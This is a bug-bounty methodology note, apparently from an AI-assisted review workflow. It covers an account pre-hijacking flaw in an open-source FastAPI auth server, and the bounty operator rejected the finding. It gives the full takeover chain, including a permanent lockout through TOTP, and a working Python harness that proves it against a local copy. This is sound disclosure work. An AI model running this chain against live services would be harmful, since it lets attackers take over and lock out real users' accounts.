# Web2 auth-server / account-lifecycle review (source-only)

Companion to `codebase-bounty-review` PART 2e. Worked case: **DedSec CCTV**
(`github.com/QuacksOnWelfare/DedSecCCTV`, v1.0.3, Python + FastAPI auth server + PyQt6 desktop app +
Ed25519-signed updater), 2026-10-30.

> ⚠️ **REJECTED — not a valid standalone finding (2026-11).** The "account pre-hijacking via the
> registration flow" report (High, 3/3 runtime-validated) was rejected by the operator: the sign-up
> code screen has a **"change email"** option, so the victim simply switches address and the planted
> password never becomes their account. Treat the mechanics below as a registration-flow code pattern
> to *recognize*, NOT as a paid bug class by itself — it only wins when email is an unchangeable,
> no-recovery identity and the victim has no escape path.

---

## 1. Reading the program before reading the code

A small OSS project with an active bounty is a different shape from a mature protocol:

- `SECURITY.md` is the door. Pull it raw: `curl -sL https://raw.githubusercontent.com/<org>/<repo>/main/SECURITY.md`.
  Extract: supported versions, **the only reporting channel** (DedSec: GitHub Security → "Report a
  vulnerability"; there is NO security email — do not invent one), the severity ladder (which tells
  you which bug classes pay), the in/out-of-scope lists, and the safe-harbour rules.
- **"Your PoC must be tested only against your own account or your own self-hosted copy"** is the
  sentence that decides the whole validation strategy: the official API is off-limits, so the PoC
  harness runs locally. That is not a limitation — it is what makes the finding provable.
- Out-of-scope traps to check before writing up: "automated scanner output with no proof of impact",
  "missing best-practice headers with no real impact", "anything that requires an already compromised
  user PC", DoS/stress testing, social engineering.
- Clone `--depth 1`, then map the tree. For a server app the security surface is
  `routes/` + `security.py` + `models.py` + `ratelimit.py` + `schemas.py` + `config.py` — read those
  before anything else. The desktop app and updater are a second surface (see §6).

## 2. The bug class: account pre-hijacking via registration

### Root cause (DedSec CCTV, `server/app/routes/auth.py` → `register()`)

```python
existing = db.scalar(select(User).where(User.email == email))
if existing is None:
    user = User(..., password_hash=pw_hash, ...)   # first caller's password is stored
    db.add(user); db.commit()
    _issue_verification(db, user)
elif not existing.email_verified:
    _issue_verification(db, existing)              # code resent, password_hash left untouched
else:
    ... send "someone tried to register" notice ...
```

The `elif` branch was written to stop an attacker from *overwriting* a real user's password. For a
not-yet-verified account it does the opposite: it lets an attacker **plant** a password that the
rightful owner activates by verifying their own email — something every new user does during normal
onboarding. The code comment confesses it: `# resend; password is NOT changed`.

### Attack chain (no attacker↔victim interaction)

1. Attacker `POST /auth/register` with victim's email + attacker's password → account created
   unverified with the attacker's password; 6-digit code emailed to the victim (never read).
2. Victim signs up normally with their own password → code resent, stored password unchanged.
3. Victim enters the code from their inbox → `email_verified = True`, bound to the attacker's password.
4. Attacker logs in with their password → **full takeover**. Victim's own password → 401.
5. Attacker binds their device (HWID lock) and enables TOTP 2FA. There is **no TOTP-disable
   endpoint** (switching back to email 2FA requires a valid TOTP code), and the password-reset flow
   does not clear 2FA or the device binding → the victim cannot self-recover.

### Checklist for every registration/verification pair

- Does re-registration of an unverified account update the password, or keep the first caller's?
- Does the victim's own normal action activate attacker-planted state?
- Does the takeover survive a password reset? (Check whether reset clears 2FA / device binding.)
- Is there a disable path for every enable path? (A 2FA method with no disable endpoint converts any
  takeover primitive into a permanent lockout — that is the severity amplifier, state it.)
- Severity mapping: "reading or changing other users' data" = High in most ladders; it borders
  Critical when the victim's own ordinary sign-up is the only "interaction" required.

## 3. Local FastAPI PoC harness (the recipe)

For a Python/FastAPI target, the whole exploit runs in-process with `TestClient`. The traps:

- **`get_settings()` is `lru_cache`d and reads env at first import.** Set every env var BEFORE
  importing `app.main`, exactly as the repo's own `tests/conftest.py` does.
- **Memory email backend** (`EMAIL_BACKEND=memory`) captures the verification codes in
  `get_sender().outbox` — extract with a regex over the body (`Your code: (\d{6})`).
- **Isolated SQLite per run**: `DATABASE_URL=sqlite:///<fresh tmpdir>/poc.db` so each validation run
  is independent.
- **`limiter.reset()`** at the start of each run (the in-memory rate limiter persists across
  `TestClient` instances in one process).
- **`DEVICE_LOCK_REQUIRE_HWID=false`** isolates the logic bug from the device lock — otherwise the
  first login binds a device and you are proving the wrong thing. (Re-enable it in a second PoC to
  show the lockout amplification.)
- **Password policy gotcha**: `password_problems()` rejects any password containing the email's
  local part (`must not contain your email name`). The victim's test password must not contain
  "victim" — use something like `Zx9!qwErTy-Uiop`. A 422 on step 2 is this, not a failed exploit.
- Raise `RATE_LIMIT_IP_PER_MINUTE` / `RATE_LIMIT_ACCOUNT_PER_15MIN` to 10000 so the harness is not
  fighting the limiter.

Working skeleton (run from `server/`):

```python
import os, sys, re, secrets, base64, tempfile
_tmp = tempfile.mkdtemp()
os.environ.update({
    "ENVIRONMENT": "test",
    "DATABASE_URL": f"sqlite:///{_tmp}/poc.db",
    "JWT_SECRET": secrets.token_urlsafe(64),
    "TOTP_ENCRYPTION_KEY": base64.urlsafe_b64encode(secrets.token_bytes(32)).decode(),
    "EMAIL_BACKEND": "memory",
    "RATE_LIMIT_IP_PER_MINUTE": "10000",
    "RATE_LIMIT_ACCOUNT_PER_15MIN": "10000",
    "DEVICE_LOCK_REQUIRE_HWID": "false",
})
sys.path.insert(0, os.path.abspath("."))
from fastapi.testclient import TestClient
from app.main import app
from app.emailer import get_sender
from app.ratelimit import limiter

outbox = get_sender()
def latest_code(email):
    msgs = [m for m in outbox.outbox if m[0] == email]
    return re.search(r"Your code: (\d{6})", msgs[-1][2]).group(1)

limiter.reset(); outbox.outbox.clear()
with TestClient(app) as c:
    assert c.post("/auth/register", json={"email": V, "password": ATTACKER_PW}).status_code == 202
    assert c.post("/auth/login",    json={"email": V, "password": ATTACKER_PW}).status_code == 403
    assert c.post("/auth/register", json={"email": V, "password": VICTIM_PW}).status_code == 202
    assert c.post("/auth/verify-email",
                  json={"token": latest_code(V), "email": V}).status_code == 200
    assert c.post("/auth/login", json={"email": V, "password": VICTIM_PW}).status_code == 401
    r = c.post("/auth/login", json={"email": V, "password": ATTACKER_PW})
    assert r.status_code == 200, r.text          # attacker owns the account
```

**Validation discipline:** run the harness as three separate processes (fresh tmpdir each) and show
all three `RESULT: VULNERABLE` lines. Then run the repo's own suite as the baseline:
`PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 python -m pytest tests/ -q -p no:cacheprovider` (19 passed) —
"the target's own tests pass unchanged, so this is a code path they do not cover" is a strong
sentence in the report.

## 4. Leads that died — and why (record as verified negatives)

- **XFF rate-limit bypass.** `client_ip()` honours `X-Forwarded-For` when `TRUST_PROXY_HEADERS=true`,
  which looks like a per-IP-limit bypass. But the shipped `server/deploy/Caddyfile.example` does
  `header_up X-Forwarded-For {client_ip}` — Caddy OVERWRITES the header with the resolved client IP,
  so a client-supplied value never reaches the app. **Read the deploy config before claiming it.**
- **No-email verification brute force.** `POST /auth/verify-email` with only a 6-digit code checks
  every pending token, but a global 300/hour cap plus the per-IP limiter makes 1M codes impractical.
  The GET variant is exempt from the version check but rejects 6-char tokens (`10 <= len(token)`).
- **Updater RCE / signature bypass.** The app pins an Ed25519 public key, verifies the signature over
  the exact `latest.json` bytes, re-checks the zip SHA-256, and confines the download URL to the
  update base (`resolve_update_url` refuses other hosts, query strings, and `..`). The updater itself
  rejects absolute paths, drive letters, `..`, and symlinks in the zip, with backup/rollback. Solid —
  no finding.
- **JWT.** HS256 pinned (`algorithms=["HS256"]`), audience + issuer + required claims enforced,
  `token_version` checked on every authenticated route. No alg-confusion.

## 5. Delivery: PDF + Gmail draft

- **PDF:** `mcp_office_html_to_pdf` failed (`AttributeError: 'CallToolResult' object has no attribute
  'isError'`). Fall back to a **reportlab platypus** script written to an absolute path and run with
  the system python (`BaseDocTemplate` + `PageTemplate` onPage header/footer, `ParagraphStyle` set,
  `Table` for the metadata block, `code_block()` with `&<>` escaped and `<br/>` for newlines). ~10 KB
  PDF, self-contained, PoC inlined as an appendix (never reference an attachment you did not attach).
- **Gmail draft with attachment:** `gmail_ops.py draft` cannot attach. Build the MIME yourself via
  `bounty_mail.account_files()` / `gmail_service()` — **pick the bounty account by label
  (`RESEARCHER_USERNAME`), never `accts[0]`** — `MIMEMultipart("mixed")` + `MIMEText` body + `MIMEBase` PDF
  part with `Content-Disposition: attachment`, then `drafts.create` with the base64url raw. Verify
  with `gmail_ops.py drafts --account RESEARCHER_USERNAME` (newest subject = your draft).
- **Channel honesty:** when the program's only channel is GitHub Security Advisories, say so in the
  report body and mark the draft's `To:` as a placeholder for the operator to fix.
- Body shape (operator rule): greeting + who you are + the channel → the finding with the exact
  request and observed result → "nothing was changed / tested only against my own self-hosted copy"
  → polite close, signed with the real name. No reward language. One finding = one draft = one PDF.

## 6. The second surface: desktop app + updater

For an app+server project, after the server is done, sweep the client:

- `dedsec_auth_client.py` — token storage (OS keyring first, DPAPI/Fernet file fallback), HWID
  derivation (SHA-256 of MachineGuid + volume serial, truncated to 32 hex), `trust_env=False`,
  HTTPS-only unless localhost dev.
- `updater.py` — zip-slip/symlink guards, backup/rollback, launch-path confinement.
- `app.py` update path — `resolve_update_url`, `verify_manifest_signature`, `parse_latest`, the
  pinned `UPDATE_PUBLIC_KEY_B64` (placeholder ⇒ reject all updates).
- Check the app version gate (`minversion.py`, `X-DedSec-App-Version`) and which routes are exempt.
